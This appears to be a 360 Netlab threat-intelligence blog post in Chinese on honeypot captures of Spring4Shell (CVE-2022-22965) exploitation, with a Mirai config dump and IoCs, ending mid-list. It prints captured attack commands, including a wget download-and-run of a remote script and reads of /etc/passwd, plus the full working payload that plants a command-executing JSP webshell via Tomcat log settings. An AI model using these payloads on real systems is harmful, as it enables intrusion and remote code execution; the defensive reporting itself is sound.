<html lang="en"><head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Spring4Shell在野漏洞传播分析</title>
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=a1b70de19f">

    <link rel="shortcut icon" href="/favicon.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Spring4Shell在野漏洞传播分析">
    <meta property="og:description" content="背景介绍
2022年3月31号，Spring针对Spring4Shell漏洞(CVE-2022-22965)事件发布了安全公告[1]
[https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement]
，并提供了漏洞修复程序，此次漏洞事件在安全社区引起广泛关注。

2022年3月21号，360网络安全研究院高级威胁狩猎蜜罐系统[2] [https://netlab.360.com/zh/honeypot]
首次监测到了该漏洞在野传播过程，我们也看到了Mirai僵尸网络入场，相关在野漏洞攻击威胁情报已通过自动化形式输出。

可以看到在厂商安全公告之前，该漏洞已经开始在野传播并利用，这值得安全社区关注。

Spring4Shell 在野传播
2021年3月21日开始，360网络安全研究院高级威胁狩猎蜜罐系统持续监测到Spring4Shell漏洞(CVE-2022-22965)扫描和漏洞利用行为，部分源IP地理位置分布如下：
[/content/images/2022/04/spring4shell_scan">
    <meta property="og:url" content="https://blog.netlab.360.com/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory/">
    <meta property="article:published_time" content="2022-04-01T16:47:43.000Z">
    <meta property="article:modified_time" content="2022-04-01T17:09:28.000Z">
    <meta property="article:tag" content="honeypot">
    <meta property="article:tag" content="Spring4Shell">
    <meta property="article:tag" content="CVE-2022-22965">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Spring4Shell在野漏洞传播分析">
    <meta name="twitter:description" content="背景介绍
2022年3月31号，Spring针对Spring4Shell漏洞(CVE-2022-22965)事件发布了安全公告[1]
[https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement]
，并提供了漏洞修复程序，此次漏洞事件在安全社区引起广泛关注。

2022年3月21号，360网络安全研究院高级威胁狩猎蜜罐系统[2] [https://netlab.360.com/zh/honeypot]
首次监测到了该漏洞在野传播过程，我们也看到了Mirai僵尸网络入场，相关在野漏洞攻击威胁情报已通过自动化形式输出。

可以看到在厂商安全公告之前，该漏洞已经开始在野传播并利用，这值得安全社区关注。

Spring4Shell 在野传播
2021年3月21日开始，360网络安全研究院高级威胁狩猎蜜罐系统持续监测到Spring4Shell漏洞(CVE-2022-22965)扫描和漏洞利用行为，部分源IP地理位置分布如下：
[/content/images/2022/04/spring4shell_scan">
    <meta name="twitter:url" content="https://blog.netlab.360.com/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="houliuyang">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="honeypot, Spring4Shell, CVE-2022-22965">
    <meta name="twitter:site" content="@360Netlab">
    
    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "logo": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
    },
    "author": {
        "@type": "Person",
        "name": "houliuyang",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2021/03/----_20210324152831-3.jpg",
            "width": 724,
            "height": 724
        },
        "url": "https://blog.netlab.360.com/author/houliuyang/",
        "sameAs": []
    },
    "headline": "Spring4Shell在野漏洞传播分析",
    "url": "https://blog.netlab.360.com/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory/",
    "datePublished": "2022-04-01T16:47:43.000Z",
    "dateModified": "2022-04-01T17:09:28.000Z",
    "keywords": "honeypot, Spring4Shell, CVE-2022-22965",
    "description": "背景介绍\n2022年3月31号，Spring针对Spring4Shell漏洞(CVE-2022-22965)事件发布了安全公告[1]\n[https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement]\n，并提供了漏洞修复程序，此次漏洞事件在安全社区引起广泛关注。\n\n2022年3月21号，360网络安全研究院高级威胁狩猎蜜罐系统[2] [https://netlab.360.com/zh/honeypot]\n首次监测到了该漏洞在野传播过程，我们也看到了Mirai僵尸网络入场，相关在野漏洞攻击威胁情报已通过自动化形式输出。\n\n可以看到在厂商安全公告之前，该漏洞已经开始在野传播并利用，这值得安全社区关注。\n\nSpring4Shell 在野传播\n2021年3月21日开始，360网络安全研究院高级威胁狩猎蜜罐系统持续监测到Spring4Shell漏洞(CVE-2022-22965)扫描和漏洞利用行为，部分源IP地理位置分布如下：\n[/content/images/2022/04/spring4shell_scan",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://blog.netlab.360.com/"
    }
}
    </script>

    <script src="/public/ghost-sdk.min.js?v=a1b70de19f"></script>
<script>
ghost.init({
	clientId: "ghost-frontend",
	clientSecret: "2a7213b591a9"
});
</script>
    <meta name="generator" content="Ghost 2.13">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-83587830-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- Fix first paragraph font size -->
<style type="text/css">
 .post-template .post-content > p:first-child {font-size: 1em;}
</style>

<script src="https://blog-netlab-360.disqus.com/embed.js" data-timestamp="1648834568481"></script><link rel="prefetch" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.63860eb743c7d9d2adf0fa435788abe7.css"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.9450cde9dd2c9d366781a8fc5ff6e933.js"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.90614da243fa6052a038b5539f5086e5.js"><link rel="prefetch" as="script" href="https://disqus.com/next/config.js"><style id="fit-vids-style">.fluid-width-video-container{flex-grow: 1;width:100%;}.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style><script src="https://c.disquscdn.com/next/embed/alfie_v4.63f1ab6d6b9d5807dc0c94ef3fe0b851.js" async="" charset="UTF-8"></script></head>
<body class="post-template tag-honeypot tag-spring4shell tag-cve-2022-22965">

    <div class="site-wrapper">

             <header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
                <a class="site-nav-logo" href="https://blog.netlab.360.com"><img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360"></a>
            <ul class="nav" role="menu">
    <li class="nav-botnet" role="menuitem"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon" role="menuitem"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos" role="menuitem"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns" role="menuitem"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai" role="menuitem"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta" role="menuitem"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

    </div>
    <div class="site-nav-right">
        <div class="social-links">
                <a class="social-link social-link-tw" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
</a>
        </div>
            <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
</a>
    </div>
</nav>
    </div>
    </header>


    <main id="site-main" class="site-main outer">
        <div class="inner">

            <article class="post-full post tag-honeypot tag-spring4shell tag-cve-2022-22965 no-image">

                <header class="post-full-header">
                    <section class="post-full-meta">
                        <time class="post-full-meta-date" datetime="2022-04-01">1 April                            2022</time>
                        <span class="date-divider">/</span> <a href="/tag/honeypot/">honeypot</a>
                    </section>
                    <h1 class="post-full-title">Spring4Shell在野漏洞传播分析</h1>
                </header>


                <section class="post-full-content">
                    <div class="post-content">
                        <h3 id="">背景介绍</h3>
<p>2022年3月31号，Spring针对Spring4Shell漏洞(CVE-2022-22965)事件发布了安全公告[<a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">1]</a>，并提供了漏洞修复程序，此次漏洞事件在安全社区引起广泛关注。</p>
<p>2022年3月21号，360网络安全研究院高级威胁狩猎蜜罐系统[<a href="https://netlab.360.com/zh/honeypot">2]</a>首次监测到了该漏洞在野传播过程，我们也看到了Mirai僵尸网络入场，相关在野漏洞攻击威胁情报已通过自动化形式输出。</p>
<p>可以看到在厂商安全公告之前，该漏洞已经开始在野传播并利用，这值得安全社区关注。</p>
<h3 id="spring4shell">Spring4Shell 在野传播</h3>
<p>2021年3月21日开始，360网络安全研究院高级威胁狩猎蜜罐系统持续监测到Spring4Shell漏洞(CVE-2022-22965)扫描和漏洞利用行为，部分源IP地理位置分布如下：<br>
<a href="https://blog.netlab.360.com/content/images/2022/04/spring4shell_scanner_distribution.png"><img src="https://blog.netlab.360.com/content/images/2022/04/spring4shell_scanner_distribution.png" class="kg-image"></a></p>
<p>以下是Top 10 国家/地区统计列表</p>
<pre><code>United States      92
The Netherlands    49
Germany            30
China              21
France              6
Luxembourg          6
Sweden              6
Switzerland         5
Ukraine             5
Austria             4
</code></pre>
<p>我们监测到大量Webshell和测试文件的上传行为，相应文件信息如下所示：<br>
<a href="https://blog.netlab.360.com/content/images/2022/04/webshell.png"><img src="https://blog.netlab.360.com/content/images/2022/04/webshell.png" class="kg-image"></a></p>
<p>部分在野漏洞利用命令信息如下所示：</p>
<pre><code>echo%20ddfdsfasdfasd
echo%20fdsafasdfasd
echo%202222222
ls
ls%20/tmp/
whoami
%2Fbin%2Fsh%2F-c%24%7BIFS%7D%27cd%24%7BIFS%7D%2Ftmp%3Bwget%24%7BIFS%7Dhttp%3A%2F%2F107.174.133.167%2Ft.sh%24%7BIFS%7D-O-%A6sh%24%7BIFS%7DSpringCore%3B%27 
cat+/etc/passwd 
chdir 
cmd /c dir 
cmd /c net user 
curl+<a class="vglnk" href="http://111.4vcrkb.dnslog.cn/1.jpg" rel="nofollow"><span>http</span><span>://</span><span>111</span><span>.</span><span>4vcrkb</span><span>.</span><span>dnslog</span><span>.</span><span>cn</span><span>/</span><span>1</span><span>.</span><span>jpg</span></a> 
curl+<a class="vglnk" href="http://12121.4vcrkb.dnslog.cn/1.jpg" rel="nofollow"><span>http</span><span>://</span><span>12121</span><span>.</span><span>4vcrkb</span><span>.</span><span>dnslog</span><span>.</span><span>cn</span><span>/</span><span>1</span><span>.</span><span>jpg</span></a> 
curl+<a class="vglnk" href="http://35456.4vcrkb.dnslog.cn/1.jpg" rel="nofollow"><span>http</span><span>://</span><span>35456</span><span>.</span><span>4vcrkb</span><span>.</span><span>dnslog</span><span>.</span><span>cn</span><span>/</span><span>1</span><span>.</span><span>jpg</span></a> 
dir 
echo 
echo 8888888888  
echo %USERNAME%  
echo %computername% 
echo &lt;/xss&gt; 
echo fucker_test_test 
echo rinima  
echo%20%3Csvg%20onload=confirm`xss`%3E 
echo%20%3Csvg%20onload=confirm`xsssssss`%3E 
echo%20ddfdsfasdfasd 
echo%20fdsafasdfasd 
echo%202222222 
echo+22222 
echo+`whoami` 
echo+whoami 
exp
id 
ifconfig 
ls 
ls%20/tmp/ 
ping -n 2 uup0fk.dnslog.cn 
ping uup0fk.dnslog.cn 
uname 
whoami 
whoami%0A 
</code></pre>
<h3 id="spring4shell">Spring4Shell 漏洞分析</h3>
<p>Spring4Shell漏洞(CVE-2022-22965)是在JDK 9版本及以上新增module特性后导致的，并且是针对CVE-2010-1622漏洞补丁的绕过。</p>
<h4 id="cve20101622">CVE-2010-1622 漏洞分析</h4>
<p>CVE-2010-1622漏洞是Spring Bean的CachedIntrospectionResults类在调用java.beans.Introspector.getBeanInfo()枚举属性赋值时，没有指定stop类，导致父类(Object.class是任何java对象的父类)属性可被攻击者恶意控制。</p>
<p>Spring参数绑定支持用户提交表单以 参数=值 的形式进行对象赋值，同时user.address.street=Disclosure+Str等价于frmObj.getUser().getAddress().setStreet("Disclosure Str.")。因此可通过user.address.street=Disclosure+Str的方式给PropertyDescriptor[]中的第一个class属性赋值。如通过classLoader控制class属性，进而构造利用链。</p>
<p><strong>漏洞补丁</strong><br>
Spring通过将classLoader加入属性数组黑名单的方式修补漏洞。<br>
<a href="https://blog.netlab.360.com/content/images/2022/04/patch.png"><img src="https://blog.netlab.360.com/content/images/2022/04/patch.png" class="kg-image"></a></p>
<h4 id="cve202222965">CVE-2022-22965 漏洞分析</h4>
<p>在参数绑定过程中，包含class属性，与CVE-2010-1622漏洞问题类似：<br>
<a href="https://blog.netlab.360.com/content/images/2022/04/class.png"><img src="https://blog.netlab.360.com/content/images/2022/04/class.png" class="kg-image"></a></p>
<p>CVE-2022-22965是CVE-2010-1622补丁的绕过，在JDK11+Tomcat8.5.77+spring-webmvc5.3.17版本中，调试发现通过class.module.classLoader.*可以加载ParallelWebappClassLoader绕过黑名单对classLoader的检测:<br>
<a href="https://blog.netlab.360.com/content/images/2022/04/classloader.png"><img src="https://blog.netlab.360.com/content/images/2022/04/classloader.png" class="kg-image"></a></p>
<p>在野Payload：</p>
<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=222
</code></pre>
<p>pattern指定日志记录的格式，suffix指定日志记录的后缀为.jsp，directory指定日志保存的目录webapps/ROOT，prefix指定文件名tomcatwar，fileDateFormat指定日志文件名日期格式，上述payload通过Tomcat的class AbstractAccessLogValve修改了日志的存储格式、目录和文件名，实现了Webshell的上传。</p>
<p><strong>漏洞补丁</strong><br>
新增了严格的黑名单限制<br>
<a href="https://blog.netlab.360.com/content/images/2022/04/patch1.png"><img src="https://blog.netlab.360.com/content/images/2022/04/patch1.png" class="kg-image"></a></p>
<h3 id="mirai">Mirai僵尸网络</h3>
<p>我们看到Mirai僵尸网络很快入场，相关配置信息解密如下所示：</p>
<pre><code> [0x01]: "46.175.146.159\x00", size=15
 [0x02]: "A\x84", size=2
 [0x03]: "D\xfd", size=2
 [0x04]: "U better back the fuck off CIANigger &gt;&gt;&gt;---&lt;3--&gt;\x00", size=49
 [0x05]: "shell\x00", size=6
 [0x06]: "enable\x00", size=7
 [0x07]: "system\x00", size=7
 [0x08]: "sh\x00", size=3
 [0x09]: "/bin/busybox DEMONS\x00", size=20
 [0x0a]: "DEMONS: applet not found\x00", size=25
 [0x0b]: "ncorrect\x00", size=9
 [0x0c]: "/bin/busybox ps\x00", size=16
 [0x0d]: "assword\x00", size=8
 [0x0e]: "ogin\x00", size=5
 [0x0f]: "enter\x00", size=6
 [0x10]: "/proc/\x00", size=7
 [0x11]: "/exe\x00", size=5
 [0x12]: "/fd\x00", size=4
 [0x13]: "/maps\x00", size=6
 [0x14]: "/proc/net/tcp\x00", size=14
 [0x15]: "/etc/resolv.conf\x00", size=17
 [0x16]: "nameserver\x00", size=11
 [0x17]: "Pully\x13SHD\x1aiIGK\x1cDig\x13\x18}Bfpc]MkGp^b\x12[}P\x1b\\~m`b`^rc\x13Xeg\x13G\x1a\x12z*", size=57
 [0x18]: "i586\x00", size=5
 [0x19]: "i486\x00", size=5
 [0x1a]: "x86\x00", size=4
 [0x1b]: "i686\x00", size=5
 [0x1c]: "mips\x00", size=5
 [0x1d]: "mipsel\x00", size=7
 [0x1e]: "mpsl\x00", size=5
 [0x1f]: "sh4\x00", size=4
 [0x20]: "superh\x00", size=7
 [0x21]: "ppc\x00", size=4
 [0x22]: "powerpc\x00", size=8
 [0x23]: "spc\x00", size=4
 [0x24]: "sparc\x00", size=6
 [0x25]: "(deleted)\x00", size=10
 [0x26]: "abcdefghijklmnopqrstuvwxyz\x00", size=27
 [0x27]: "%d.%d.%d.%d\x00", size=12
 [0x28]: "POST /cdn-cgi/\x00", size=15
 [0x29]: "UPX!\x00", size=5
 [0x2a]: "botnet\x00", size=7
 [0x2b]: "ddos\x00", size=5
 [0x2c]: "oginenterassword\x00", size=17
 [0x2d]: "GET/  HTTP/1.1\x00", size=15
 [0x2e]: "garm\x00", size=5
 [0x2f]: "gx86\x00", size=5
 [0x30]: "gmips\x00", size=6
 [0x31]: "gmpsl\x00", size=6
 [0x32]: "gsh4\x00", size=5
 [0x33]: "gspc\x00", size=5
 [0x34]: "gppc\x00", size=5
 [0x35]: "gsec\x00", size=5
 [0x36]: ".glm\x00", size=5
 [0x37]: "cronx86\x00", size=8
 [0x38]: "cronarm\x00", size=8
 [0x39]: "cronmips\x00", size=9
 [0x3a]: "cronmpsl\x00", size=9
 [0x3b]: "cronsh4\x00", size=8
 [0x3c]: "cronspc\x00", size=8
 [0x3d]: "cronppc\x00", size=8
 [0x3e]: "cronsh\x00", size=7
 [0x3f]: "gi686\x00", size=6
 [0x40]: "/dev/watchdog\x00", size=14
 [0x41]: "/dev/misc/watchdog\x00", size=19
 [0x42]: "/dev/FTWDT101_watchdog\x00", size=23
 [0x43]: "/dev/FTWDT101 watchdog\x00\x12", size=24
 [0x44]: "/dev/watchdog0\x00", size=15
 [0x45]: "/etc/default/watchdog\x00", size=22
 [0x46]: "/sbin/watchdog\x00", size=15
</code></pre>
<h4 id="webshell">Webshell和测试文件列表</h4>
<table>
<thead>
<tr>
<th>filepath</th>
<th>count</th>
</tr>
</thead>
<tbody>
<tr>
<td>/tmp/log222.txt</td>
<td>3973</td>
</tr>
<tr>
<td>webapps/ROOT/log111.txt</td>
<td>2051</td>
</tr>
<tr>
<td>webapps/ROOT/tomcatwar.jsp</td>
<td>110</td>
</tr>
<tr>
<td>webapps/ROOT/wpz.jsp</td>
<td>27</td>
</tr>
<tr>
<td>/../webapps/ROOT/logout.jsp</td>
<td>12</td>
</tr>
<tr>
<td>./webapps/ROOT/test2%20%20.txt</td>
<td>9</td>
</tr>
<tr>
<td>webapps/ROOT/log101.txt</td>
<td>7</td>
</tr>
<tr>
<td>/log_data_9.jsp</td>
<td>3</td>
</tr>
<tr>
<td>webapps/ROOT/xiaozhan.jsp</td>
<td>3</td>
</tr>
<tr>
<td>webapps/ROOT/1122.jsp</td>
<td>3</td>
</tr>
<tr>
<td>webapps/ROOT/0985763860781234.jsp</td>
<td>3</td>
</tr>
<tr>
<td>/2023.jsp</td>
<td>3</td>
</tr>
<tr>
<td>webapps/ROOT/zhuzhuxias.jsp</td>
<td>3</td>
</tr>
<tr>
<td>webapps/ROOT/log147.txt</td>
<td>2</td>
</tr>
<tr>
<td>webapps/ROOT/aaa69875.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log186.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa36917.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/member3war.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa96225.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log154.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log103.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log176.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/7FMNZ.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa28643.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa49231.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa50586.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log112.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log110.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa80751.jsp</td>
<td>1</td>
</tr>
<tr>
<td>/2021.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa10854.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log105.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa93089.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/35456.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log182.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa24348.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log131.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/indexbk.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log149.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log179.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/webappsbak/sxxd1648765386.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log150.txt</td>
<td>1</td>
</tr>
<tr>
<td>Webapps/ROOT/78754.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa24168.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa10487.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log178.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/lapsus</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/zhuzhuxia.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log135.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa40373.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/qweasd.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/console.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa79694.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa54378.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log129.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/pCJrI.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log162.txt</td>
<td>1</td>
</tr>
<tr>
<td>Webapps/ROOT/7875456457.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log200.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/8888888888.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/8888888888.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log128.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/log124.txt</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa14058.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa94175.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/conf.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/stupidRumor_war/tomcatwar.jsp</td>
<td>1</td>
</tr>
<tr>
<td>webapps/ROOT/aaa83816.jsp</td>
<td>1</td>
</tr>
</tbody>
</table>
<h3 id="">处置建议</h3>
<p>我们建议Spring用户及时升级漏洞程序，并排查相应Webshell文件路径。</p>
<h3 id="">联系我们</h3>
<p>感兴趣的读者，可以在 <a href="https://twitter.com/360Netlab"><strong>twitter</strong></a> 或者通过邮件<strong>netlab[at]360.cn</strong>联系我们。</p>
<h4 id="ioclist">IoC List</h4>
<p>Mirai C2</p>
<pre><code>46.175.146.159:16772
</code></pre>
<p>IP</p>
<pre><code>1.85.220.54         	China               	AS4134              	CHINANET-BACKBONE   
3.239.1.141         	United States       	AS14618             	AMAZON-AES          
5.2.69.50           	The Netherlands     	AS60404             	Liteserver          
14.0.170.249        	China               	AS38819             	HKCSL-AS-AP         
23.128.248.10       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.11       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.12       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.13       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.14       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.15       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.16       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.17       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.19       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.20       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.21       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.22       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.23       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.24       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.25       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.27       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.28       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.29       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.33       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.34       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.38       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.39       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.40       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.41       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.42       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.43       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.44       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.46       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.48       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.50       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.51       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.53       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.54       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.55       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.56       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.57       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.58       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.59       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.60       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.61       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.62       	United States       	AS398355            	DATAIDEAS-LLC       
23.128.248.63       	United States       	AS398355            	DATAIDEAS-LLC       
